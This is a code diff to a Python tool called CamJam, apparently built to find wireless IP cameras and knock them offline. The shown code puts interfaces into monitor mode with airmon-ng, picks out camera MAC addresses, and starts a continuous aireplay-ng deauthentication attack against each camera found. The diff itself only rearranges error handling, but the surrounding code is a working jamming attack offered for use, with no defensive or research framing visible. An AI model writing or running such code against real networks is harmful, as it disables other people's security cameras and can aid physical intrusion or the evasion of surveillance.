@@ -57,7 +57,6 @@ class CamJam:
         commandstring = 'sudo airmon-ng start '+self.interfacescan
         try:
             process = subprocess.check_output(commandstring, shell=True)
-
             process = process.decode("utf-8")
             ifmon = self.interfacescan+"mon"
 
@@ -131,11 +130,16 @@ class CamJam:
                                                     mac = mac.replace("-", ":")
                                                     print ("New IP Camera found: "+ mac + " - " + apmac + " - " + channel)
 
-                                                    try:        # Will probably break when second camera is identified, not tested yet.
+                                                    try:
                                                         commandstring1 = 'sudo airmon-ng start '+self.interfacedeauth+ " " + channel
                                                         process1 = subprocess.check_output(commandstring1, shell=True)      # Puts network interface on the correct channel for deauthentication. 
                                                         process1 = process1.decode("utf-8")
                                                         ifmon1 = self.interfacedeauth+"mon"
+                                                    except:
+                                                        pass
+
+                                                    try:
+
                                                         if ifmon1 in process1:
                                                             aireplayprocess = subprocess.Popen(['aireplay-ng', '-0', '0', '-c'+ mac, '-a' + apmac, ifmon1], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)        # Starts deauth attack. 
                                                             print ("Started deauth attack: " + str(aireplayprocess.pid))
